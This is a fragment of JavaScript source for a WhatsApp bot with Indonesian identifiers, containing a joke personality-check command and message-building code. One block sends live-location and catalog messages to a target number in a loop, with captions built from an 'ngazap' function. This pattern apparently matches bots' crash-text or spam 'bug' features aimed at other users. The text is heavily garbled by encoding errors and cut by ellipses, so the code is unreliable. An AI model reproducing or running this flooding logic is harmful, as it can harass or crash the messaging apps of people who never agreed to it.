...
try {
        ...
        const prefix = /^[¡ã?¦Ð¡Â¡Á????€????_=|~!?#$%^&.+-,\/\\?^]/.test(body) ? body.match(/^[¡ã?¦Ð¡Â¡Á????€????_=|~!?#$%^&.+-,\/\\?^]/gi) : '#'
...
case 'cekme':
					...
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*¡Ô¨T¨T¨T¨T¡¶ Cek Sifat @${bet.split('@')[0]} ¡·¨T¨T¨T¨T¡Ô*
...
*¡Ô¨T¨T¨T¨T¨T¡¶ CEKSIFATME ¡·¨T¨T¨T¨T¨T¡Ô*`
...
var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `???????-BayMax ????_¤µ¤ó ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: lep })
for (let i = 0; i < jumlah; i++) {
...
BayMax.sendKatalog(numt, `???????-BayMax ????_¤µ¤ó ${ngazap(prefix)}`, `???????-BayMax ????_¤µ¤ó ${ngazap(prefix)}`, ppnyauser, { quoted: lep })
